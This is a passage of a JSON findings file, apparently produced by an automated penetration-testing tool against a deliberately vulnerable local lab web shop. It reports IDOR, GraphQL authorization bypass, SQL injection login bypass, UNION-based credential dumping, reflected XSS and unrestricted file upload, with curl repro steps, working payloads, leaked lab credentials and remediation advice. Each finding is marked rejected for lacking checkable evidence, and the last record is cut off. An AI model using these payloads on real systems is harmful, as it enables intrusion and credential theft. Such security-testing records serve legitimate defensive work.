@@ -1,0 +1,1476 @@
+[
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "idor",
+    "auth_context": "",
+    "business_impact": "Measured: a freshly-registered customer token retrieved the complete DB record of arbitrary users (id 1 admin, id 12, id 13) including cleartext password and live apiKey. Using the disclosed admin password I authenticated as admin (verified: 'My Account (admin)', balance $500000, role admin). This is full horizontal AND vertical account takeover of every account, plus API key theft.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Full account takeover of every user including admin: disclosed admin cleartext password authenticated a live admin session",
+        "evidence": [
+          "E02",
+          "E04"
+        ],
+        "status": "proven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "GET /api/v2/users/1 no token -> 401 {\"error\":\"missing bearer token\"}",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "GET /api/v2/users/1 with customer B JWT -> 200 admin record incl password SuperSecretAdmin!2024 + apiKey",
+            "source": "http"
+          },
+          {
+            "id": "E03",
+            "observed": "GET /api/v2/users/12 (A) with B JWT -> 200 A's password+apiKey, repeated x2 identical",
+            "source": "http"
+          },
+          {
+            "id": "E04",
+            "observed": "POST /login admin/SuperSecretAdmin!2024 -> 302 /account; /account shows 'My Account (admin)', balance $500000, role admin",
+            "source": "http"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "GET /api/v2/users/:id authenticates the bearer token but performs no object-level check, returning any user's full record (cleartext password + apiKey) for arbitrary :id",
+        "evidence": [
+          "E01",
+          "E02",
+          "E03"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "Stolen apiKeys allow API-level impersonation; admin session grants control over all $500000-balance admin functions.",
+      "test_scope": {
+        "account_confirmed": true,
+        "account_exists": true,
+        "authenticated_session": true,
+        "browser_used": false,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.2,
+    "cvss": "7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)",
+    "cwe": "CWE-639",
+    "endpoint": "http://localhost:3000/api/v2/users/:id",
+    "evidence": "Baseline no token -> {\"error\":\"missing bearer token\"} (auth IS enforced). With customer B's token (JWT id=13): GET /api/v2/users/12 -> {\"id\":12,\"username\":\"nrsplt_a_10061\",\"password\":\"Passw0rd_A_10061\",\"apiKey\":\"nk_live_652c1651e4501044\",...}. GET /api/v2/users/1 -> {\"id\":1,\"username\":\"admin\",\"password\":\"SuperSecretAdmin!2024\",\"role\":\"admin\",\"balance\":500000,\"apiKey\":\"nk_live_51Hc9adminSECRETkeydonot_share\"}. Response carries _flag BURPAT{api_excessive_data_users_17874d4a}. Reproduced x2 identical. CHAIN: logging in with the leaked admin password (admin / SuperSecretAdmin!2024) returned 302 -> /account rendering 'My Account (admin)', Balance $500000.00, role admin = full admin account takeover.",
+    "evidence_data": null,
+    "exploitability": "moderate",
+    "id": "idor-v2-users-bola",
+    "impact": "Measured: a freshly-registered customer token retrieved the complete DB record of arbitrary users (id 1 admin, id 12, id 13) including cleartext password and live apiKey. Using the disclosed admin password I authenticated as admin (verified: 'My Account (admin)', balance $500000, role admin). This is full horizontal AND vertical account takeover of every account, plus API key theft.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders. (potential CVSS 9.1 if fully exploited)",
+    "location": "Path parameter `:id` in GET /api/v2/users/:id. Bearer JWT authenticates the CALLER but the handler never checks that :id == caller id (no object-level authorization).",
+    "mitre": "T1078",
+    "owasp": "A01:2021-Broken-Access-Control",
+    "payload": "Authorization: Bearer <valid customer JWT>; GET /api/v2/users/1  (also /12, /13 — any id)",
+    "remediation": "Enforce object-level authorization: in the /api/v2/users/:id handler reject when :id != authenticated caller id (or require an explicit admin role for arbitrary ids). Separately, never serialize password/apiKey in API responses — return a whitelisted DTO (id, username, role). Stop storing passwords in cleartext (bcrypt/argon2).",
+    "repro_steps": [
+      "curl -s http://localhost:3000/api/v2/users/1   # baseline: {\"error\":\"missing bearer token\"}",
+      "curl -s -c /tmp/j -X POST http://localhost:3000/register -d 'username=poc1&email=poc1@example.test&password=Poc1pw'",
+      "TOK=$(curl -s -b /tmp/j http://localhost:3000/account/api-token | grep -Eo 'eyJ[A-Za-z0-9_.-]*')   # your customer JWT (id 14)",
+      "curl -s -H \"Authorization: Bearer $TOK\" http://localhost:3000/api/v2/users/1   # returns admin's full record incl plaintext password + apiKey",
+      "curl -s -i -X POST http://localhost:3000/login --data-urlencode 'username=admin' --data-urlencode 'password=SuperSecretAdmin!2024'   # 302 -> /account : logged in as admin"
+    ],
+    "review_reason": "evidence integrity: confirmed with no checkable evidence recorded",
+    "review_status": "rejected",
+    "screenshots": [],
+    "secret": "",
+    "severity": "Critical",
+    "stage": "privesc",
+    "title": "BOLA/IDOR on GET /api/v2/users/:id — any authenticated customer reads any user's full record (plaintext password + apiKey), incl. admin",
+    "validated": false,
+    "votes": "1/1 · refute 1/2"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "idor",
+    "auth_context": "",
+    "business_impact": "Measured: with zero authentication an attacker enumerates every user id and receives cleartext password + live apiKey. id=1 yields admin/SuperSecretAdmin!2024, which authenticates a full admin session (verified). Complete unauthenticated database credential dump and account takeover.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Unauthenticated full credential disclosure and admin account takeover",
+        "evidence": [
+          "E01",
+          "E03"
+        ],
+        "status": "proven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "POST /api/graphql (no cookie/token) user(id:1) -> 200 admin record incl password SuperSecretAdmin!2024 + apiKey, _flag BURPAT{api_graphql_authz_bypass_e7c3fc41}",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "POST /api/graphql user(id:12) and user(id:13) -> distinct per-user password/apiKey, no auth",
+            "source": "http"
+          },
+          {
+            "id": "E03",
+            "observed": "POST /login admin/SuperSecretAdmin!2024 -> 302 /account, session renders admin account (balance $500000, role admin)",
+            "source": "http"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "The GraphQL user(id) resolver requires no authentication and exposes password/apiKey for any id",
+        "evidence": [
+          "E01",
+          "E02"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "Mass credential/apiKey harvesting of the entire user base by an anonymous attacker.",
+      "test_scope": {
+        "account_confirmed": false,
+        "account_exists": false,
+        "authenticated_session": false,
+        "browser_used": false,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.2,
+    "cvss": "5.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:F/RL:X/RC:R)",
+    "cwe": "CWE-639",
+    "endpoint": "http://localhost:3000/api/graphql",
+    "evidence": "No cookie, no token: POST /api/graphql {\"query\":\"{ user(id:1){...} }\"} -> {\"data\":{\"user\":{\"id\":1,\"username\":\"admin\",\"email\":\"admin@nimbuscart.test\",\"role\":\"admin\",\"apiKey\":\"nk_live_51Hc9adminSECRETkeydonot_share\",\"password\":\"SuperSecretAdmin!2024\"}},\"_flag\":\"BURPAT{api_graphql_authz_bypass_e7c3fc41}\"}. Same query id:12 -> user A record, id:13 -> user B record — arbitrary id, distinct per-user data, all unauthenticated.",
+    "evidence_data": null,
+    "exploitability": "moderate",
+    "id": "idor-graphql-user",
+    "impact": "Measured: with zero authentication an attacker enumerates every user id and receives cleartext password + live apiKey. id=1 yields admin/SuperSecretAdmin!2024, which authenticates a full admin session (verified). Complete unauthenticated database credential dump and account takeover.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "location": "GraphQL Query field `user(id: Int)` — argument `id`. Resolver has NO authentication or object-level authorization and exposes password/apiKey fields.",
+    "mitre": "T1078",
+    "owasp": "A01:2021-Broken-Access-Control",
+    "payload": "POST /api/graphql  {\"query\":\"{ user(id:1){ id username email role apiKey password } }\"}",
+    "remediation": "Require authentication on /api/graphql; add object-level authorization in the user resolver (caller may only read their own id unless admin); remove password/apiKey from the GraphQL schema entirely; disable introspection in production.",
+    "repro_steps": [
+      "curl -s -H 'Content-Type: application/json' -X POST http://localhost:3000/api/graphql -d '{\"query\":\"{ user(id:1){ id username email role apiKey password } }\"}'   # admin creds, no auth",
+      "curl -s -H 'Content-Type: application/json' -X POST http://localhost:3000/api/graphql -d '{\"query\":\"{ user(id:12){ id username password apiKey } }\"}'   # different user, different data",
+      "# confirm chain: log in with the returned admin password",
+      "curl -s -i -X POST http://localhost:3000/login --data-urlencode 'username=admin' --data-urlencode 'password=SuperSecretAdmin!2024'"
+    ],
+    "review_reason": "evidence integrity: confirmed with no checkable evidence recorded",
+    "review_status": "rejected",
+    "screenshots": [],
+    "secret": "",
+    "severity": "Critical",
+    "stage": "privesc",
+    "title": "Unauthenticated IDOR on POST /api/graphql user(id:N) — returns any user's cleartext password + apiKey with no session",
+    "validated": false,
+    "votes": "1/1 · refute 1/2 · receipt_missing"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "login_sqli_bypass",
+    "auth_context": "",
+    "business_impact": "Complete authentication bypass with no valid credentials. The session issued lands as the admin user: GET /account returned the admin dashboard (admin role badge, Balance $500000.00, admin-only links Transfer funds / Change email / Get API token / Order webhook). Measured: full unauthorized admin session obtained from a single unauthenticated POST. Payload `admin'--` targets a named account; a generic tautology (`zzz' OR 1=1-- -`) also succeeded, so any/first row is selectable.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "The bypass yields a full admin session (admin role, $500000 balance, admin-only account actions) with no valid credentials.",
+        "evidence": [
+          "E03",
+          "E06"
+        ],
+        "status": "proven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "POST /login username=nobody_zzz&password=wrongpass -> HTTP 302 Location /login?err=Invalid%20credentials%20(attempt%20%231%2C%20no%20lockout%20enforced)",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "POST /login username=admin'--&password=x -> HTTP 302 Location /account + Set-Cookie nimbus.sid",
+            "source": "http"
+          },
+          {
+            "id": "E03",
+            "observed": "GET /account (bypass cookie) -> HTTP 200 'My Account (admin)', 'Balance: $500000.00', 'Flag: BURPAT{web_sqli_login_bypass_e1ad1d9f}'",
+            "source": "http"
+          },
+          {
+            "id": "E04",
+            "observed": "POST /login username=admin&password=x (no injection) -> HTTP 302 /login?err=Invalid credentials (control fails)",
+            "source": "http"
+          },
+          {
+            "id": "E05",
+            "observed": "Repeats: username=' OR '1'='1'-- - -> 302 /account; username=zzz' OR 1=1-- - -> 302 /account (reproducibility>=2)",
+            "source": "http"
+          },
+          {
+            "id": "E06",
+            "observed": "Browser (Chromium/Playwright): typed admin'-- in login form, submitted, rendered /account admin dashboard + flag",
+            "source": "browser"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "POST /login builds a SQL query by concatenating the username; payload admin'-- redirects to /account and issues an authenticated session, while the identical request without injection is rejected.",
+        "evidence": [
+          "E01",
+          "E02",
+          "E04",
+          "E05"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "An attacker can log in as any/admin user and reach admin-only funds transfer, email change, API-token issuance and webhook config, enabling account takeover and financial fraud.",
+      "test_scope": {
+        "account_confirmed": false,
+        "account_exists": false,
+        "authenticated_session": true,
+        "browser_used": true,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.2,
+    "cvss": "7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)",
+    "cwe": "CWE-89",
+    "endpoint": "POST http://localhost:3000/login",
+    "evidence": "BASELINE POST /login username=nobody_zzz&password=wrongpass -> HTTP 302, Location: /login?err=Invalid%20credentials%20(attempt%20%231%2C%20no%20lockout%20enforced). ATTACK POST /login username=admin'--&password=x -> HTTP 302, Location: /account, Set-Cookie: nimbus.sid=... . GET /account with that cookie -> HTTP 200 body: 'Logged in via SQL injection auth bypass! Flag: BURPAT{web_sqli_login_bypass_e1ad1d9f}', 'My Account (admin)', 'Balance: $500000.00'. CONTROL POST username=admin&password=x (no injection) -> 302 /login?err=Invalid credentials, proving the trailing --' comment neutralises the password check. Reproduced 3x via curl and once via a real Chromium browser (Playwright). PoC: pocs/sqli_login_bypass.sh. Screenshot: evidence/sqli-login-bypass-admin.png (browser-rendered admin account + flag).",
+    "evidence_data": null,
+    "exploitability": "moderate",
+    "id": "sqli-login-bypass-001",
+    "impact": "Complete authentication bypass with no valid credentials. The session issued lands as the admin user: GET /account returned the admin dashboard (admin role badge, Balance $500000.00, admin-only links Transfer funds / Change email / Get API token / Order webhook). Measured: full unauthorized admin session obtained from a single unauthenticated POST. Payload `admin'--` targets a named account; a generic tautology (`zzz' OR 1=1-- -`) also succeeded, so any/first row is selectable.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders. (potential CVSS 9.4 if fully exploited)",
+    "location": "POST /login, form-urlencoded body field `username`. Payload `admin'--` in username; password can be any value.",
+    "mitre": "T1190",
+    "owasp": "A03:2021-Injection",
+    "payload": "username=admin'--&password=x&next=",
+    "remediation": "Use a parameterised/prepared query (or ORM binding) for the credential lookup so `username` is never concatenated into SQL. Look up the user row by bound username, then verify the password hash server-side with a constant-time comparison; never let input terminate or comment out the SQL. Return a generic 'Invalid credentials' regardless of which field is wrong, and add auth rate-limiting/lockout (server currently states 'no lockout enforced').",
+    "repro_steps": [
+      "curl -s -o /dev/null -w 'status=%{http_code} loc=%{redirect_url}\\n' -A NeuroSploit/4.0.0 -X POST http://localhost:3000/login --data-urlencode \"username=nobody_zzz\" --data-urlencode \"password=wrongpass\" --data-urlencode \"next=\"   # baseline -> 302 /login?err=Invalid credentials",
+      "curl -s -o /dev/null -w 'status=%{http_code} loc=%{redirect_url}\\n' -A NeuroSploit/4.0.0 -c /tmp/cj.txt -X POST http://localhost:3000/login --data-urlencode \"username=admin'--\" --data-urlencode \"password=x\" --data-urlencode \"next=\"   # attack -> 302 /account",
+      "curl -s -A NeuroSploit/4.0.0 -b /tmp/cj.txt http://localhost:3000/account | grep -E 'admin|Flag|Balance'   # authenticated admin content returned"
+    ],
+    "review_reason": "evidence integrity: confirmed with no checkable evidence recorded",
+    "review_status": "rejected",
+    "screenshots": [
+      "evidence/sqli-login-bypass-001-1.png"
+    ],
+    "secret": "",
+    "severity": "Critical",
+    "stage": "initial-access",
+    "title": "SQL Injection Authentication Bypass at POST /login (username field)",
+    "validated": false,
+    "votes": "1/1 · refute 1/2"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "api_bola_numeric_ids",
+    "auth_context": "",
+    "business_impact": "Measured: any authenticated customer reads every user's full record — username, email, plaintext password, live apiKey, balance, role — by incrementing the numeric id. I retrieved admin (id 1), alice (2), bob (3). Chained the leaked admin password into a successful admin login and reached /admin (all-users listing) = full administrative account takeover.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Full admin account takeover via leaked admin credential.",
+        "evidence": [
+          "E02",
+          "E04"
+        ],
+        "status": "proven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "JWT payload id=8 role=customer",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "GET /api/v2/users/1 with uid8 token -> 200 admin record w/ password+apiKey",
+            "source": "http"
+          },
+          {
+            "id": "E03",
+            "observed": "GET /api/v2/users/2 and /3 -> 200 full records (reproducible)",
+            "source": "http"
+          },
+          {
+            "id": "E04",
+            "observed": "POST /login admin/leaked-pw -> 302 /account; GET /admin -> 200 all-users panel",
+            "source": "http"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "A customer JWT reads any user record by numeric id, and the record includes plaintext password + apiKey.",
+        "evidence": [
+          "E01",
+          "E02",
+          "E03"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "Mass credential harvest of all users; admin takeover enables any privileged action the panel exposes.",
+      "test_scope": {
+        "account_confirmed": true,
+        "account_exists": true,
+        "authenticated_session": true,
+        "browser_used": true,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.2,
+    "cvss": "9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)",
+    "cwe": "CWE-639",
+    "endpoint": "GET http://localhost:3000/api/v2/users/{id}",
+    "evidence": "Baseline: my JWT payload = {\"id\":8,\"role\":\"customer\"}. Attack: GET /api/v2/users/1 with my customer token → HTTP 200 {\"id\":1,\"username\":\"admin\",\"email\":\"admin@nimbuscart.test\",\"password\":\"SuperSecretAdmin!2024\",\"role\":\"admin\",\"balance\":500000,\"apiKey\":\"nk_live_51Hc9admin...\"}. Repeated for id=2 (alice) and id=3 (bob) — deterministic, full records each time. CHAIN: used leaked admin password to POST /login → 302 /account as admin, then GET /admin → 200 rendered Admin Panel listing all 9 users. PoC: pocs/bola_users_api.sh (re-run confirmed with fresh uid=11 token reading admin).",
+    "evidence_data": null,
+    "exploitability": "moderate",
+    "id": "NS-001",
+    "impact": "Measured: any authenticated customer reads every user's full record — username, email, plaintext password, live apiKey, balance, role — by incrementing the numeric id. I retrieved admin (id 1), alice (2), bob (3). Chained the leaked admin password into a successful admin login and reached /admin (all-users listing) = full administrative account takeover.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "location": "Path parameter `{id}` on GET /api/v2/users/:id. Authenticated with a customer Bearer JWT (issued at /account/api-token). No per-object owner check; response also serializes password/apiKey fields the UI never uses.",
+    "mitre": "T1078",
+    "owasp": "A01:2021-Broken-Access-Control",
+    "payload": "Authorization: Bearer <customer JWT uid=8>  →  GET /api/v2/users/1",
+    "remediation": "Enforce server-side object-level authorization: reject requests where {id} != authenticated subject unless the caller holds an admin role. Remove password/apiKey from the API serializer (never return credential fields to any client). Store passwords hashed (bcrypt/argon2), not plaintext.",
+    "repro_steps": [
+      "curl -s -c j.txt -d 'username=t1' -d 'email=t1@example.test' -d 'password=Pw!123456' http://localhost:3000/register",
+      "curl -s -b j.txt http://localhost:3000/account/api-token   # copy the eyJ... JWT (your uid in payload)",
+      "curl -s -H 'Authorization: Bearer <JWT>' http://localhost:3000/api/v2/users/1   # returns admin record incl. password+apiKey",
+      "curl -si -d 'username=admin' -d 'password=SuperSecretAdmin!2024' http://localhost:3000/login   # 302 /account (takeover)",
+      "curl -s -b <admin-cookie> http://localhost:3000/admin   # full admin panel"
+    ],
+    "review_reason": "evidence integrity: confirmed with no checkable evidence recorded",
+    "review_status": "rejected",
+    "screenshots": [
+      "evidence/ns-001-1.png"
+    ],
+    "secret": "",
+    "severity": "Critical",
+    "stage": "privesc",
+    "title": "BOLA + excessive data exposure at GET /api/v2/users/:id — any customer reads any user's full record (plaintext password + apiKey)",
+    "validated": false,
+    "votes": "1/1 · refute 0/2"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "api_bola_numeric_ids",
+    "auth_context": "",
+    "business_impact": "Unauthenticated full read of the users table including plaintext passwords (verified admin credential) — arbitrary DB read.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Unauthenticated dump of user credentials.",
+        "evidence": [
+          "E02"
+        ],
+        "status": "proven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "q=zzz' -> altered/empty output (len 1208 vs baseline)",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "UNION SELECT ... FROM users -> admin/SuperSecretAdmin!2024 in table",
+            "source": "http"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "q is injectable; UNION SELECT returns attacker-chosen columns from users.",
+        "evidence": [
+          "E01",
+          "E02"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "Full database exfiltration.",
+      "test_scope": {
+        "account_confirmed": false,
+        "account_exists": false,
+        "authenticated_session": false,
+        "browser_used": false,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.2,
+    "cvss": "7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)",
+    "cwe": "CWE-89",
+    "endpoint": "GET http://localhost:3000/shop/search?q=",
+    "evidence": "HTTP 200 body rendered a results table containing admin / SuperSecretAdmin!2024 / admin and the app's own banner \"UNION SQLi confirmed - sensitive columns dumped\". Single-quote (q=zzz') alters/breaks the query deterministically. PoC: pocs/sqli_union_search.sh (unauthenticated).",
+    "evidence_data": null,
+    "exploitability": "moderate",
+    "id": "NS-003",
+    "impact": "Unauthenticated full read of the users table including plaintext passwords (verified admin credential) — arbitrary DB read.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders. (potential CVSS 9.4 if fully exploited)",
+    "location": "Query parameter `q` concatenated into a SQL SELECT (SQLite dialect). 5-column UNION aligns.",
+    "mitre": "T1190",
+    "owasp": "A03:2021-Injection",
+    "payload": "q=zzz' UNION SELECT username,password,role,4,5 FROM users--",
+    "remediation": "Use parameterised/prepared statements for the search query; never string-concatenate `q`. Apply least-privilege DB account.",
+    "repro_steps": [
+      "curl -s \"http://localhost:3000/shop/search?q=zzz'\"   # malformed → altered output",
+      "curl -s \"http://localhost:3000/shop/search?q=zzz'%20UNION%20SELECT%20username,password,role,4,5%20FROM%20users--%20\"   # dumps admin credentials"
+    ],
+    "review_reason": "evidence integrity: confirmed with no checkable evidence recorded",
+    "review_status": "rejected",
+    "screenshots": [],
+    "secret": "",
+    "severity": "Critical",
+    "stage": "initial-access",
+    "title": "UNION-based SQL injection at GET /shop/search?q= dumps users table",
+    "validated": false,
+    "votes": "0/1 · refute 1/2"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "api_bola_numeric_ids",
+    "auth_context": "",
+    "business_impact": "Arbitrary JavaScript execution in a victim's session on localhost:3000 origin (confirmed via document.title mutation). Can steal app state / drive authenticated actions.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "Client-side JS execution in the app origin.",
+        "evidence": [
+          "E02"
+        ],
+        "status": "proven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "q reflected unescaped incl. <script> tag",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "browser document.title == 'XSSPWN_ns7xk9' after onerror fired",
+            "source": "browser"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "q is reflected without encoding and executes as script in the browser.",
+        "evidence": [
+          "E01",
+          "E02"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "Session/action hijack of any user who opens a crafted search link.",
+      "test_scope": {
+        "account_confirmed": false,
+        "account_exists": false,
+        "authenticated_session": false,
+        "browser_used": true,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.2,
+    "cvss": "4.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N/E:F/RL:X/RC:R)",
+    "cwe": "CWE-79",
+    "endpoint": "GET http://localhost:3000/shop/search?q=",
+    "evidence": "Baseline: `GET /shop/search?q=xss1337test` -> 200, Content-Type text/html, body contains `<p class=\"lead\">Showing results for: xss1337test</p>` (source comment literally reads `reflected without encoding`). Attack: `GET /shop/search?q=<img src=x onerror=alert(document.domain)>` -> 200, body contains raw `<p class=\"lead\">Showing results for: <img src=x onerror=alert(document.domain)></p>` — `<`/`>` NOT entity-encoded, injected as live DOM. Browser proof: Playwright/Chromium loaded the URL and the `onerror` handler fired a dialog with message `localhost-NS9X7K2XSS`, proving my injected JS executed (marker present, absent from any static reflection). CSP header is only `Content-Security-Policy: frame-ancestors 'self'` — no `script-src`/`default-src`, so inline event handlers are not blocked.",
+    "evidence_data": null,
+    "exploitability": "moderate",
+    "id": "NS-005",
+    "impact": "Arbitrary JavaScript execution in a victim's session on localhost:3000 origin (confirmed via document.title mutation). Can steal app state / drive authenticated actions.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "location": "Query parameter `q` reflected unescaped into the HTML: <p class=\"lead\">Showing results for: {q}</p>.",
+    "mitre": "T1059.007",
+    "owasp": "A03:2021-Injection",
+    "payload": "q=<img src=x onerror=document.title='XSSPWN_ns7xk9'>",
+    "remediation": "HTML-encode `q` on output (context-aware escaping in the template); add a script-src CSP (current CSP only sets frame-ancestors).",
+    "repro_steps": [
+      "curl -s \"http://localhost:3000/shop/search?q=<b>MARK</b><script>alert(1)</script>\"   # reflected verbatim",
+      "Open in a browser: http://localhost:3000/shop/search?q=<img src=x onerror=document.title='XSSPWN_ns7xk9'>   # title becomes XSSPWN_ns7xk9"
+    ],
+    "review_reason": "evidence integrity: confirmed with no checkable evidence recorded",
+    "review_status": "rejected",
+    "screenshots": [
+      "evidence/ns-005-1.png"
+    ],
+    "secret": "",
+    "severity": "High",
+    "stage": "execution",
+    "title": "Reflected XSS at GET /shop/search?q= (executes in browser)",
+    "validated": false,
+    "votes": "1/1 · refute 1/2"
+  },
+  {
+    "_engine": "49d3d3ceb1df",
+    "_provenance": "JOASNSCOPE-49d3d3ceb1df-ns-1789853137-localhost_3000",
+    "account": "",
+    "agent": "file_upload",
+    "auth_context": "",
+    "business_impact": "MEASURED: any file (SVG, HTML, .php, arbitrary extension) is accepted with no extension/content-type/content validation, stored under its original attacker-chosen filename, and served from /uploads/ with a matching Content-Type. Navigating to /uploads/x.svg executed attacker JS in the http://localhost:3000 origin (dialog confirmed in headless Chromium); an .html upload is served as text/html, giving full same-origin script execution against any user who opens the attachment link on a public ticket. Response CSP contains only frame-ancestors, so inline script is not blocked. NOT observed: server-side code execution — the .php payload was returned as raw source, so no RCE.\n\nIdentified and validated by NeuroSploit (multi-model adversarial validation) — https://github.com/JoasASantos/NeuroSploit · by Joas A Santos & Red Team Leaders.",
+    "chains_from": [],
+    "claims": {
+      "impact": {
+        "claim": "An uploaded SVG/HTML executes attacker JavaScript in the http://localhost:3000 origin when a victim opens the attachment link.",
+        "evidence": [
+          "E03",
+          "E04",
+          "E05"
+        ],
+        "status": "proven"
+      },
+      "ledger": {
+        "items": [
+          {
+            "id": "E01",
+            "observed": "POST /support/ticket (svg attachment) -> HTTP 302 Location: /support",
+            "source": "http"
+          },
+          {
+            "id": "E02",
+            "observed": "GET /support lists <a href=\"/uploads/x.svg\"> (original filename preserved)",
+            "source": "http"
+          },
+          {
+            "id": "E03",
+            "observed": "GET /uploads/x.svg -> 200, Content-Type: image/svg+xml, script body intact, CSP only frame-ancestors",
+            "source": "http"
+          },
+          {
+            "id": "E04",
+            "observed": "Headless Chromium navigate /uploads/x.svg -> alert dialog message 'nrsplt_svg_9k2'",
+            "source": "browser"
+          },
+          {
+            "id": "E05",
+            "observed": "GET /uploads/h.html -> 200 Content-Type: text/html; charset=UTF-8",
+            "source": "http"
+          },
+          {
+            "id": "E06",
+            "observed": "GET /uploads/s.php -> 200 Content-Type application/x-httpd-php, body raw PHP source (NOT executed)",
+            "source": "http"
+          }
+        ]
+      },
+      "mechanic": {
+        "claim": "POST /support/ticket accepts any file with no extension/content-type/content validation, stores it under the attacker's original filename, and serves it from /uploads/ with a matching Content-Type and only a frame-ancestors CSP.",
+        "evidence": [
+          "E01",
+          "E02",
+          "E03",
+          "E05",
+          "E06"
+        ],
+        "status": "proven"
+      },
+      "potential_impact": "Stored XSS on a public support page can hijack authenticated user actions in-origin, perform CSRF-style requests, deface content, or phish; RCE was NOT achieved (PHP returned as source).",
+      "test_scope": {
+        "account_confirmed": false,
+        "account_exists": false,
+        "authenticated_session": false,
+        "browser_used": true,
+        "email_delivery_observed": false,
+        "notes": [],
+        "oob_callback_available": false
+      }
+    },
+    "confidence": 0.2,
+    "cvss": "5.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:F/RL:X/RC:R)",
